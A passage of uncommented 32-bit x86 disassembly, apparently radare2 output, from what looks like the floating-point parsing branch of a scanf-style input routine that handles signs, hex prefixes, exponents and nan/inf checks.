call fcn.0804e190
cmp ebx, dword [ebp - 0xc8]
ja 0x8071baa
jmp 0x80716aa
test esi, esi
jle 0x8071b3a
mov edx, dword [ebp - 0xf0]
cmp dword [ebp - 0xf4], edx
je 0x8071cb2
movzx edx, byte [ebp - 0x9c]
mov eax, dword [ebp - 0xf4]
inc ebx
mov ecx, dword [ebp - 0xec]
mov byte [eax + ecx], dl
inc eax
mov dword [ebp - 0xf4], eax
cmp byte [ebx], 0
je 0x8071b3e
cmp dword [ebp - 0x9c], 0xffffffff
je 0x8071c9e
mov ecx, dword [ebp + 8]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x8071c8e
movzx edx, byte [eax]
mov ecx, dword [ebp + 8]
inc eax
mov dword [ecx + 4], eax
mov dword [ebp - 0x9c], edx
cmp dword [ebp - 0x9c], 0xffffffff
je 0x8071c7f
inc dword [ebp - 0x98]
mov eax, dword [ebp - 0x9c]
mov dword [ebp - 0x9c], eax
inc eax
je 0x8071c77
movzx edx, byte [ebx]
dec esi
movzx eax, dl
cmp eax, dword [ebp - 0x9c]
jne 0x8071b3a
test esi, esi
jg 0x8071bd8
jmp 0x8071b3a
movzx edx, byte [ebx]
jmp 0x8071b3a
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x8071c48
mov dword [esp], ecx
call fcn.0804da90
mov dword [ebp - 0x9c], eax
jmp 0x8071c39
call fcn.08048b20
mov edx, dword [ebp - 0xb4]
mov dword [eax], edx
mov eax, 0xffffffff
jmp 0x8071c4e
shl dword [ebp - 0xf0], 1
mov eax, 0x100
mov edx, dword [ebp - 0xec]
cmp dword [ebp - 0xf0], 0xff
cmova eax, dword [ebp - 0xf0]
mov dword [ebp - 0xf0], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea ecx, [esp + 0x1f]
and ecx, 0xfffffff0
test edx, edx
mov dword [ebp - 0xec], ecx
je 0x8071bea
mov eax, dword [ebp - 0xf4]
mov dword [esp + 4], edx
mov dword [esp], ecx
mov dword [esp + 8], eax
call fcn.08053770
jmp 0x8071bea
mov esi, dword [var_100h]
inc esi
cmp esi, dword [var_104h]
jg 0x807199a
mov dword [var_108h], 0
mov eax, dword [var_a0h]
mov edi, 0x7fffffff
test eax, eax
mov eax, dword [var_108h]
cmovg edi, dword [var_a0h]
mov ebx, dword [ebp + eax*4 - 0x4c]
movzx edx, byte [ebx]
movzx eax, dl
cmp eax, dword [var_9ch]
je 0x8071e43
test dl, dl
je 0x8071e19
mov edx, dword [ebp - 0x108]
mov eax, dword [ebp + edx*4 - 0x4c]
cmp ebx, eax
jbe 0x8071db3
cmp dword [ebp - 0x9c], 0xffffffff
je 0x8071da5
movzx eax, byte [ebp - 0x9c]
mov ecx, dword [ebp + 8]
dec dword [ebp - 0x98]
mov dword [esp], ecx
mov dword [esp + 4], eax
call fcn.0804e190
mov edx, dword [ebp - 0x108]
mov eax, dword [ebp + edx*4 - 0x4c]
dec ebx
cmp ebx, eax
ja 0x8071df0
movzx ebx, byte [ebx]
mov dword [ebp - 0x9c], ebx
mov dword [esp + 4], 0
mov dword [esp], eax
call fcn.080537a0
mov ecx, dword [ebp - 0x108]
inc eax
mov dword [ebp + ecx*4 - 0x4c], eax
inc ecx
cmp ecx, 9
mov dword [ebp - 0x108], ecx
jle 0x8071d30
inc esi
cmp esi, dword [ebp - 0x104]
jle 0x8071d26
jmp 0x807199a
dec dword [ebp - 0x98]
mov ecx, dword [ebp + 8]
movzx eax, byte [ebx]
dec ebx
mov dword [esp], ecx
mov dword [esp + 4], eax
call fcn.0804e190
mov edx, dword [ebp - 0x108]
mov eax, dword [ebp + edx*4 - 0x4c]
cmp ebx, eax
ja 0x8071df0
jmp 0x8071daa
mov eax, dword [ebp - 0xa0]
test eax, eax
jle 0x8071e29
mov dword [ebp - 0xa0], edi
cmp dword [ebp - 0x108], 9
jg 0x8071dde
mov dword [ebp - 0x100], esi
mov dword [ebp - 0x104], esi
jmp 0x807199a
test edi, edi
jle 0x8071d60
nop
lea esi, [esi]
inc ebx
cmp byte [ebx], 0
je 0x8071e19
cmp dword [ebp - 0x9c], 0xffffffff
je 0x8071edb
mov ecx, dword [ebp + 8]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x8071ecb
movzx edx, byte [eax]
mov ecx, dword [ebp + 8]
inc eax
mov dword [ecx + 4], eax
mov dword [ebp - 0x9c], edx
cmp dword [ebp - 0x9c], 0xffffffff
je 0x8071ebc
inc dword [ebp - 0x98]
mov eax, dword [ebp - 0x9c]
mov dword [ebp - 0x9c], eax
inc eax
je 0x8071eb4
movzx edx, byte [ebx]
dec edi
movzx eax, dl
cmp eax, dword [ebp - 0x9c]
jne 0x8071d60
test edi, edi
jg 0x8071e50
jmp 0x8071d60
movzx edx, byte [ebx]
jmp 0x8071d60
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x8071e89
mov dword [esp], ecx
call fcn.0804da90
mov dword [ebp - 0x9c], eax
jmp 0x8071e7a
call fcn.08048b20
mov edx, dword [ebp - 0xb4]
mov dword [eax], edx
mov eax, 0xffffffff
jmp 0x8071e8f
dec dword [var_98h]
mov ecx, dword [arg_8h]
movzx eax, byte [ebx]
dec ebx
mov dword [esp], ecx
mov dword [var_4h_2], eax
call fcn.0804e190
mov edx, dword [var_108h]
mov eax, dword [ebp + edx*4 - 0x4c]
cmp ebx, eax
ja 0x8071eef
jmp 0x8071959
mov eax, dword [var_a0h]
test eax, eax
mov eax, dword [var_100h]
cmovle edi, dword [var_a0h]
mov dword [var_104h], eax
mov dword [var_a0h], edi
jmp 0x807198d
test edi, edi
jle 0x807190b
lea esi, [esi]
inc ebx
cmp byte [ebx], 0
je 0x8071f1b
cmp dword [var_9ch], 0xffffffff
je 0x8071fdb
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x8071fcb
movzx edx, byte [eax]
mov ecx, dword [arg_8h]
inc eax
mov dword [ecx + 4], eax
mov dword [var_9ch], edx
cmp dword [var_9ch], 0xffffffff
je 0x8071fbc
inc dword [var_98h]
mov eax, dword [var_9ch]
mov dword [var_9ch], eax
inc eax
je 0x8071fb4
movzx edx, byte [ebx]
dec edi
movzx eax, dl
cmp eax, dword [var_9ch]
jne 0x807190b
test edi, edi
jg 0x8071f50
jmp 0x807190b
movzx edx, byte [ebx]
jmp 0x807190b
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x8071f89
mov dword [esp], ecx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x8071f7a
call fcn.08048b20
mov edx, dword [var_b4h]
mov dword [eax], edx
mov eax, 0xffffffff
jmp 0x8071f8f
mov eax, dword [var_a0h]
dec eax
cmp dword [var_a0h], 1
cmovl eax, dword [var_a0h]
mov dword [var_a0h], eax
mov eax, dword [var_f0h]
cmp dword [var_f4h], eax
je 0x80721b2
movzx edx, byte [var_9ch]
mov eax, dword [var_f4h]
mov ecx, dword [var_ech]
mov byte [eax + ecx], dl
inc eax
cmp dword [var_9ch], 0xffffffff
mov dword [var_f4h], eax
je 0x807219b
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x8072188
movzx edx, byte [eax]
mov ecx, dword [arg_8h]
inc eax
mov dword [ecx + 4], eax
mov dword [var_9ch], edx
cmp dword [var_9ch], 0xffffffff
je 0x8072176
inc dword [var_98h]
mov eax, dword [var_9ch]
mov dword [var_9ch], eax
mov eax, dword [var_a0h]
test eax, eax
je 0x80720a4
mov ecx, dword [var_ach]
movzx edx, byte [var_9ch]
mov eax, dword [ecx + 0x38]
cmp dword [eax + edx*4], 0x78
je 0x80720c1
mov esi, dword [var_bch]
test esi, esi
jne 0x8070dc6
mov dword [var_bch], 8
jmp 0x8070dac
mov edi, dword [var_bch]
mov eax, 0x10
test edi, edi
cmovne eax, dword [var_bch]
cmp eax, 0x10
mov dword [var_bch], eax
jne 0x8070dac
mov eax, dword [var_a0h]
dec eax
cmp dword [var_a0h], 1
cmovl eax, dword [var_a0h]
cmp dword [var_9ch], 0xffffffff
mov dword [var_a0h], eax
je 0x8072162
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x8072152
movzx edx, byte [eax]
mov ecx, dword [arg_8h]
inc eax
mov dword [ecx + 4], eax
mov dword [var_9ch], edx
cmp dword [var_9ch], 0xffffffff
je 0x8072143
inc dword [var_98h]
mov eax, dword [var_9ch]
mov dword [var_9ch], eax
jmp 0x8070dac
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x8072132
mov dword [esp], ecx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x8072123
call fcn.08048b20
mov edx, dword [var_b4h]
mov dword [eax], edx
mov eax, 0xffffffff
jmp 0x8072138
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x8072078
mov dword [esp], ecx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x8072065
call fcn.08048b20
mov edx, dword [var_b4h]
mov dword [eax], edx
mov eax, 0xffffffff
jmp 0x807207e
add eax, eax
mov edx, dword [var_ech]
cmp eax, 0xff
mov dword [var_f0h], eax
mov eax, 0x100
cmova eax, dword [var_f0h]
mov dword [var_f0h], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea ecx, [var_1fh]
and ecx, 0xfffffff0
test edx, edx
mov dword [var_ech], ecx
je 0x807201c
mov eax, dword [var_f4h]
mov dword [var_4h_2], edx
mov dword [esp], ecx
mov dword [var_8h_2], eax
call fcn.08053770
jmp 0x807201c
mov eax, dword [var_f0h]
cmp dword [var_f4h], eax
je 0x80722c0
mov ecx, dword [var_ech]
mov byte [ecx], bl
mov eax, dword [var_a0h]
mov dword [var_f4h], 1
dec eax
cmp dword [var_a0h], 1
cmovl eax, dword [var_a0h]
inc ebx
mov dword [var_a0h], eax
je 0x80722ac
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x807229c
movzx edx, byte [eax]
mov ecx, dword [arg_8h]
inc eax
mov dword [ecx + 4], eax
mov dword [var_9ch], edx
cmp dword [var_9ch], 0xffffffff
je 0x807228d
inc dword [var_98h]
mov eax, dword [var_9ch]
mov dword [var_9ch], eax
jmp 0x8070d95
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x807227c
mov dword [esp], ecx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x807226d
call fcn.08048b20
mov edx, dword [var_b4h]
mov dword [eax], edx
mov eax, 0xffffffff
jmp 0x8072282
mov eax, dword [var_ech]
sub esp, 0x410
mov dword [var_f0h], 0x100
lea edx, [var_1fh]
and edx, 0xfffffff0
test eax, eax
mov dword [var_ech], edx
je 0x8072222
mov dword [var_8h_2], 0
mov dword [var_4h_2], eax
mov dword [esp], edx
call fcn.08053770
jmp 0x8072222
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x8070d66
mov dword [esp], ecx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x8070d53
call fcn.08048b20
mov ebx, 0xffffffff
mov edx, dword [var_b4h]
mov dword [eax], edx
jmp 0x8070d6c
cmp dword [var_9ch], 0xffffffff
je 0x8073cf8
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x8073ce5
movzx edx, byte [eax]
mov ecx, dword [arg_8h]
inc eax
mov dword [ecx + 4], eax
mov dword [var_9ch], edx
cmp dword [var_9ch], 0xffffffff
je 0x8073cd3
inc dword [var_98h]
mov eax, dword [var_9ch]
mov dword [var_9ch], eax
inc eax
je 0x806f8c6
cmp dword [var_9ch], 0x2d
je 0x8073abc
cmp dword [var_9ch], 0x2b
je 0x8073abc
mov ecx, dword [var_ach]
mov byte [var_b7h], 0
mov edx, dword [ecx + 0x38]
movzx eax, byte [var_9ch]
mov eax, dword [edx + eax*4]
cmp eax, 0x6e
je 0x807389f
cmp eax, 0x69
je 0x8072f5b
mov edi, dword [var_a0h]
mov dword [var_c0h], 0
mov byte [var_b8h], 0x65
test edi, edi
je 0x8072400
cmp dword [var_9ch], 0x30
je 0x8072d16
mov byte [var_b6h], 0
mov byte [var_b5h], 0
mov eax, dword [var_9ch]
sub eax, 0x30
cmp eax, 9
ja 0x80727a6
mov ecx, dword [var_f0h]
cmp dword [var_f4h], ecx
je 0x8072751
movzx eax, byte [var_9ch]
mov ecx, dword [var_f4h]
mov edx, dword [var_ech]
mov byte [ecx + edx], al
inc ecx
mov dword [var_f4h], ecx
mov eax, dword [var_a0h]
dec eax
cmp dword [var_a0h], 1
cmovl eax, dword [var_a0h]
mov dword [var_a0h], eax
mov eax, dword [var_a0h]
test eax, eax
je 0x80724c0
cmp dword [var_9ch], 0xffffffff
je 0x807273f
mov edx, dword [arg_8h]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x807272c
movzx ecx, byte [eax]
mov edx, dword [arg_8h]
inc eax
mov dword [edx + 4], eax
mov dword [var_9ch], ecx
cmp dword [var_9ch], 0xffffffff
je 0x807271a
inc dword [ebp - 0x98]
cmp dword [ebp - 0x9c], 0xffffffff
jne 0x807240e
mov eax, dword [var_f4h]
test eax, eax
je case.0x806fb57.38
mov eax, dword [var_c0h]
test eax, eax
je 0x80724f2
cmp dword [var_f4h], 2
je case.0x806fb57.38
cmp byte [ebp - 0xb6], 0
je case.0x806fb57.38
mov ecx, dword [var_f0h]
cmp dword [var_f4h], ecx
je 0x80726c5
mov eax, dword [ebp - 0xec]
mov edx, dword [ebp - 0xf4]
mov byte [edx + eax], 0
test byte [ebp - 0xa4], 2
jne 0x8072642
test byte [ebp - 0xa4], 1
je 0x80725c7
mov eax, dword [ebp - 0xa4]
and eax, 0x80
mov dword [esp + 8], eax
lea eax, [ebp - 0x80]
mov dword [esp + 4], eax
mov eax, dword [ebp - 0xec]
mov dword [esp], eax
call fcn.08085c80
test byte [ebp - 0xa4], 8
jne 0x80725c0
mov ecx, dword [ebp - 0x80]
cmp ecx, dword [ebp - 0xec]
je 0x80725b5
mov eax, dword [ebp - 0xfc]
test eax, eax
jne 0x80725a1
mov eax, dword [ebp - 0x8c]
add dword [ebp - 0x8c], 4
fld st(0)
cmp byte [ebp - 0xb7], 0
mov eax, dword [eax]
fchs
fcmove st(0), st(1)
fstp st(1)
fstp qword [eax]
cmp ecx, dword [ebp - 0xec]
jne 0x806fda5
jmp case.0x806fb57.38
mov edx, dword [ebp - 0xfc]
mov eax, dword [ebp + 0x10]
dec edx
je 0x807257d
add eax, 4
dec edx
jne 0x80725ad
jmp 0x807257d
fstp st(0)
jmp case.0x806fb57.38
lea esi, [esi]
fstp st(0)
mov ecx, dword [ebp - 0x80]
jmp 0x8072590
mov eax, dword [ebp - 0xa4]
mov edx, dword [ebp - 0xec]
and eax, 0x80
mov dword [esp], edx
mov dword [esp + 8], eax
lea eax, [ebp - 0x80]
mov dword [esp + 4], eax
call fcn.08085bc0
test byte [ebp - 0xa4], 8
jne 0x80725c0
mov ecx, dword [ebp - 0x80]
cmp ecx, dword [ebp - 0xec]
je 0x80725b5
mov edi, dword [ebp - 0xfc]
test edi, edi
jne 0x807262e
mov eax, dword [ebp - 0x8c]
add dword [ebp - 0x8c], 4
fld st(0)
cmp byte [ebp - 0xb7], 0
mov eax, dword [eax]
fchs
fcmove st(0), st(1)
fstp st(1)
fstp dword [eax]
jmp 0x8072590
mov edx, dword [ebp - 0xfc]
mov eax, dword [ebp + 0x10]
dec edx
je 0x8072616
add eax, 4
dec edx
jne 0x807263a
jmp 0x8072616
mov eax, dword [ebp - 0xa4]
mov ecx, dword [ebp - 0xec]
and eax, 0x80
mov dword [esp], ecx
mov dword [esp + 8], eax
lea eax, [ebp - 0x80]
mov dword [esp + 4], eax
call fcn.08085d40
test byte [ebp - 0xa4], 8
jne 0x80725c0
mov ecx, dword [ebp - 0x80]
cmp ecx, dword [ebp - 0xec]
je 0x80725b5
mov eax, dword [ebp - 0xfc]
test eax, eax
jne 0x80726b1
mov eax, dword [ebp - 0x8c]
add dword [ebp - 0x8c], 4
fld st(0)
cmp byte [ebp - 0xb7], 0
mov eax, dword [eax]
fchs
fcmove st(0), st(1)
fstp st(1)
fstp xword [eax]
jmp 0x8072590
mov edx, dword [ebp - 0xfc]
mov eax, dword [ebp + 0x10]
dec edx
je 0x8072699
add eax, 4
dec edx
jne 0x80726bd
jmp 0x8072699
add ecx, ecx
mov eax, 0x100
mov edx, dword [ebp - 0xec]
cmp ecx, 0xff
cmova eax, ecx
mov dword [ebp - 0xf0], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea eax, [esp + 0x1f]
and eax, 0xfffffff0
test edx, edx
mov dword [ebp - 0xec], eax
je 0x8072504
mov ecx, dword [ebp - 0xf4]
mov dword [esp + 4], edx
mov dword [esp], eax
mov dword [esp + 8], ecx
call fcn.08053770
jmp 0x8072504
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x80724b3
mov dword [esp], edx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x80724a0
call fcn.08048b20
mov edx, dword [var_b4h]
mov dword [eax], edx
jmp 0x80724c0
add ecx, ecx
mov eax, 0x100
mov edx, dword [var_ech]
cmp ecx, 0xff
cmova eax, ecx
mov dword [var_f0h], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea eax, [var_1fh_3]
and eax, 0xfffffff0
test edx, edx
mov dword [var_ech], eax
je 0x8072432
mov ecx, dword [var_f4h]
mov dword [var_4h], edx
mov dword [esp], eax
mov dword [var_8h], ecx
call fcn.08053770
jmp 0x8072432
cmp byte [var_b6h], 0
jne 0x807286b
mov esi, dword [var_c0h]
test esi, esi
je 0x8072862
mov edx, dword [var_ach]
mov ecx, dword [var_9ch]
mov eax, dword [edx + 0x34]
test byte [eax + ecx*2 + 1], 0x10
je 0x8072862
mov eax, dword [var_f0h]
cmp dword [var_f4h], eax
je 0x807280b
movzx edx, byte [var_9ch]
mov eax, dword [var_f4h]
mov ecx, dword [var_ech]
mov byte [eax + ecx], dl
inc eax
mov dword [var_f4h], eax
jmp 0x807244f
mov edx, dword [var_ech]
add eax, eax
cmp eax, 0xff
mov dword [var_f0h], eax
mov eax, 0x100
cmova eax, dword [var_f0h]
mov dword [var_f0h], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea ecx, [var_1fh_3]
and ecx, 0xfffffff0
test edx, edx
mov dword [var_ech], ecx
je 0x80727e9
mov eax, dword [var_f4h]
mov dword [var_4h], edx
mov dword [esp], ecx
mov dword [var_8h], eax
call fcn.08053770
jmp 0x80727e9
cmp byte [var_b6h], 0
je 0x8072888
mov ecx, dword [var_ech]
mov eax, dword [var_f4h]
movzx edx, byte [var_b8h]
cmp byte [eax + ecx - 1], dl
je 0x8072cd3
mov ebx, dword [var_f4h]
test ebx, ebx
je 0x80728bb
cmp byte [var_b6h], 0
jne 0x80728bb
mov ecx, dword [var_ach]
movzx edx, byte [var_9ch]
mov eax, dword [ecx + 0x38]
movzx ecx, byte [var_b8h]
cmp cl, byte [eax + edx*4]
je 0x8072c45
mov ecx, dword [var_a0h]
mov edi, 0x7fffffff
mov ebx, dword [var_c4h]
test ecx, ecx
cmovg edi, dword [var_a0h]
cmp byte [var_b5h], 0
jne 0x8072c0f
movzx edx, byte [ebx]
movzx eax, dl
cmp eax, dword [var_9ch]
je 0x8072ba5
mov ecx, dword [var_c4h]
movzx edx, byte [ecx]
test dl, dl
jne 0x80729af
mov ebx, dword [var_c4h]
cmp byte [ebx], 0
je 0x807293d
mov ecx, dword [ebp - 0xf0]
cmp dword [ebp - 0xf4], ecx
je 0x807295e
movzx eax, byte [ebx]
mov ecx, dword [ebp - 0xf4]
inc ebx
mov edx, dword [ebp - 0xec]
mov byte [ecx + edx], al
inc ecx
mov dword [ebp - 0xf4], ecx
cmp byte [ebx], 0
jne 0x8072910
mov edx, dword [ebp - 0xa0]
mov byte [ebp - 0xb5], 1
test edx, edx
cmovle edi, dword [ebp - 0xa0]
mov dword [ebp - 0xa0], edi
jmp 0x807244f
add ecx, ecx
mov eax, 0x100
mov edx, dword [ebp - 0xec]
cmp ecx, 0xff
cmova eax, ecx
mov dword [ebp - 0xf0], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea eax, [esp + 0x1f]
and eax, 0xfffffff0
test edx, edx
mov dword [ebp - 0xec], eax
je 0x807291e
mov ecx, dword [ebp - 0xf4]
mov dword [esp + 4], edx
mov dword [esp], eax
mov dword [esp + 8], ecx
call fcn.08053770
jmp 0x807291e
test byte [var_a4h], 0x80
mov esi, dword [var_c8h]
je 0x80729fe
test esi, esi
je 0x80729fe
cmp byte [ebp - 0xb5], 0
jne 0x80729fe
mov edx, ebx
sub edx, dword [ebp - 0xc4]
test edx, edx
jle 0x80729e8
mov ecx, dword [ebp - 0xc4]
movzx eax, byte [ecx]
cmp byte [esi], al
je 0x8072b81
mov eax, esi
sub ebx, dword [ebp - 0xc4]
sub eax, dword [ebp - 0xc8]
cmp eax, ebx
je 0x8072ad6
test esi, esi
je 0x8072aa8
cmp byte [esi], 0
jne 0x8072aa8
mov ebx, dword [ebp - 0xc8]
cmp byte [ebx], 0
je 0x8072a47
mov ecx, dword [ebp - 0xf0]
cmp dword [ebp - 0xf4], ecx
je 0x8072a5a
movzx eax, byte [ebx]
mov ecx, dword [ebp - 0xf4]
inc ebx
mov edx, dword [ebp - 0xec]
mov byte [ecx + edx], al
inc ecx
mov dword [ebp - 0xf4], ecx
cmp byte [ebx], 0
jne 0x8072a1a
mov eax, dword [ebp - 0xa0]
test eax, eax
jg 0x8072953
jmp 0x807246a
add ecx, ecx
mov eax, 0x100
mov edx, dword [ebp - 0xec]
cmp ecx, 0xff
cmova eax, ecx
mov dword [ebp - 0xf0], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea eax, [esp + 0x1f]
and eax, 0xfffffff0
test edx, edx
mov dword [ebp - 0xec], eax
je 0x8072a28
mov ecx, dword [ebp - 0xf4]
mov dword [esp + 4], edx
mov dword [esp], eax
mov dword [esp + 8], ecx
call fcn.08053770
jmp 0x8072a28
cmp dword [ebp - 0x9c], 0xffffffff
je 0x80724c0
movzx eax, byte [ebp - 0x9c]
dec dword [ebp - 0x98]
mov dword [esp + 4], eax
mov eax, dword [ebp + 8]
mov dword [esp], eax
call fcn.0804e190
jmp 0x80724c0
movzx eax, byte [esi]
cmp eax, dword [ebp - 0x9c]
jne 0x80729fe
test edi, edi
jle 0x80729fe
inc esi
cmp byte [esi], 0
je 0x80729fe
cmp dword [ebp - 0x9c], 0xffffffff
je 0x8072b6f
mov edx, dword [ebp + 8]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x8072b5f
movzx ecx, byte [eax]
mov edx, dword [ebp + 8]
inc eax
mov dword [edx + 4], eax
mov dword [ebp - 0x9c], ecx
cmp dword [ebp - 0x9c], 0xffffffff
je 0x8072b50
inc dword [ebp - 0x98]
cmp dword [ebp - 0x9c], 0xffffffff
je 0x80729fe
movzx eax, byte [esi]
dec edi
cmp eax, dword [ebp - 0x9c]
jne 0x80729fe
test edi, edi
jg 0x8072aed
jmp 0x80729fe
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x8072b2a
mov dword [esp], edx
call fcn.0804da90
mov dword [ebp - 0x9c], eax
jmp 0x8072b1b
call fcn.08048b20
mov edx, dword [ebp - 0xb4]
mov dword [eax], edx
jmp 0x80729fe
inc esi
mov eax, esi
sub eax, dword [ebp - 0xc8]
cmp eax, edx
jge 0x80729e8
mov ecx, dword [ebp - 0xc4]
movzx eax, byte [eax + ecx]
cmp byte [esi], al
je 0x8072b81
jmp 0x80729e8
test edi, edi
jle 0x80728fd
inc ebx
cmp byte [ebx], 0
je 0x8072905
cmp dword [ebp - 0x9c], 0xffffffff
je 0x8072c36
mov edx, dword [ebp + 8]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x8072c26
movzx ecx, byte [eax]
mov edx, dword [ebp + 8]
inc eax
mov dword [edx + 4], eax
mov dword [ebp - 0x9c], ecx
cmp dword [ebp - 0x9c], 0xffffffff
je 0x8072c17
inc dword [ebp - 0x98]
cmp dword [ebp - 0x9c], 0xffffffff
je 0x8072c0f
movzx edx, byte [ebx]
dec edi
movzx eax, dl
cmp eax, dword [ebp - 0x9c]
jne 0x80728fd
test edi, edi
jg 0x8072bad
jmp 0x80728fd
movzx edx, byte [ebx]
jmp 0x80728fd
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x8072bea
mov dword [esp], edx
call fcn.0804da90
mov dword [ebp - 0x9c], eax
jmp 0x8072bdb
call fcn.08048b20
mov edx, dword [ebp - 0xb4]
mov dword [eax], edx
jmp 0x8072c0f
mov eax, dword [var_f0h]
cmp dword [var_f4h], eax
je 0x8072c7c
movzx edx, byte [var_b8h]
mov eax, dword [var_f4h]
mov ecx, dword [var_ech]
mov byte [eax + ecx], dl
mov byte [var_b6h], 1
mov byte [var_b5h], 1
jmp 0x80727ff
add eax, eax
mov edx, dword [var_ech]
cmp eax, 0xff
mov dword [var_f0h], eax
mov eax, 0x100
cmova eax, dword [var_f0h]
mov dword [var_f0h], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea ecx, [var_1fh_3]
and ecx, 0xfffffff0
test edx, edx
mov dword [var_ech], ecx
je 0x8072c53
mov eax, dword [ebp - 0xf4]
mov dword [esp + 4], edx
mov dword [esp], ecx
mov dword [esp + 8], eax
call fcn.08053770
jmp 0x8072c53
cmp dword [var_9ch], 0x2d
je 0x8072ce9
cmp dword [var_9ch], 0x2b
jne 0x8072888
mov edx, dword [var_f0h]
cmp dword [var_f4h], edx
jne 0x80727e9
shl dword [var_f0h], 1
mov edx, dword [var_ech]
cmp dword [var_f0h], 0xff
jmp 0x807281e
mov ecx, dword [var_f0h]
cmp dword [var_f4h], ecx
je 0x8072f17
movzx ecx, byte [var_9ch]
mov eax, dword [var_ech]
mov byte [eax], cl
cmp dword [var_9ch], 0xffffffff
mov dword [var_f4h], 1
je 0x8072f00
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x8072eeb
movzx edx, byte [eax]
mov ecx, dword [arg_8h]
inc eax
mov dword [ecx + 4], eax
mov dword [var_9ch], edx
cmp dword [var_9ch], 0xffffffff
je 0x8072ed9
inc dword [var_98h]
mov ebx, dword [var_9ch]
mov eax, dword [var_a0h]
mov dword [var_9ch], ebx
dec eax
cmp dword [var_a0h], 1
cmovl eax, dword [var_a0h]
test eax, eax
mov dword [var_a0h], eax
je 0x8072400
mov ecx, dword [var_ach]
movzx edx, byte [var_9ch]
mov eax, dword [ecx + 0x38]
cmp dword [eax + edx*4], 0x78
jne 0x8072400
mov eax, dword [var_f0h]
cmp dword [var_f4h], eax
je 0x8072e95
mov ecx, dword [var_ech]
mov byte [ecx + 1], bl
and dword [var_a4h], 0xffffff7f
mov byte [var_b8h], 0x70
inc ebx
mov dword [var_f4h], 2
mov dword [var_c0h], 1
je 0x8072e81
mov ecx, dword [ebp + 8]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x8072e71
movzx edx, byte [eax]
mov ecx, dword [ebp + 8]
inc eax
mov dword [ecx + 4], eax
mov dword [ebp - 0x9c], edx
cmp dword [ebp - 0x9c], 0xffffffff
je 0x8072e62
inc dword [ebp - 0x98]
mov eax, dword [ebp - 0x9c]
mov dword [ebp - 0x9c], eax
mov eax, dword [ebp - 0xa0]
dec eax
cmp dword [ebp - 0xa0], 1
cmovl eax, dword [ebp - 0xa0]
mov dword [ebp - 0xa0], eax
jmp 0x8072400
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x8072e36
mov dword [esp], ecx
call fcn.0804da90
mov dword [ebp - 0x9c], eax
jmp 0x8072e27
call fcn.08048b20
mov edx, dword [ebp - 0xb4]
mov dword [eax], edx
mov eax, 0xffffffff
jmp 0x8072e3c
mov eax, dword [var_ech]
sub esp, 0x410
mov dword [var_f0h], 0x100
lea edx, [var_1fh_2]
and edx, 0xfffffff0
test eax, eax
mov dword [var_ech], edx
je 0x8072ddb
mov dword [var_8h_3], 1
mov dword [var_4h_3], eax
mov dword [esp], edx
call fcn.08053770
jmp 0x8072ddb
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x8072d80
mov dword [esp], ecx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x8072d6d
mov esi, esi
call fcn.08048b20
mov ebx, 0xffffffff
mov edx, dword [var_b4h]
mov dword [eax], edx
jmp 0x8072d86
mov eax, dword [var_ech]
sub esp, 0x410
mov dword [var_f0h], 0x100
lea edx, [var_1fh]
and edx, 0xfffffff0
test eax, eax
mov dword [var_ech], edx
je 0x8072d28
mov dword [var_8h_2], 0
mov dword [var_4h_2], eax
mov dword [esp], edx
call fcn.08053770
jmp 0x8072d28
mov edx, dword [var_f0h]
cmp dword [var_f4h], edx
je 0x807385b
movzx eax, byte [var_9ch]
mov edx, dword [var_ech]
mov byte [edx], al
mov edx, dword [var_a0h]
mov dword [var_f4h], 1
test edx, edx
je case.0x806fb57.38
cmp dword [var_9ch], 0xffffffff
je 0x8073849
mov edx, dword [arg_8h]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x8073836
movzx ecx, byte [eax]
mov edx, dword [arg_8h]
inc eax
